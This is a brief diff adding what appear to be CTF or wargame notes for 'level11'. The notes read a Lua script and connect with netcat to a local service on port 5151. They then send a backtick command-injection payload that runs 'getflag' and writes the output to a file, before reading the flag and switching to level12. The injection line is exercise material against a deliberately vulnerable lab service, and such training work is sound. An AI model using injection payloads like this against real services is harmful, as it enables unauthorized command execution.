@@ -1,0 +1,8 @@
+> la -al
+> cat level11.lua
+
+> nc 127.0.0.1 5151
+> `getflag` > tmp/flag
+
+> cat /tmp/flag
+> su level12
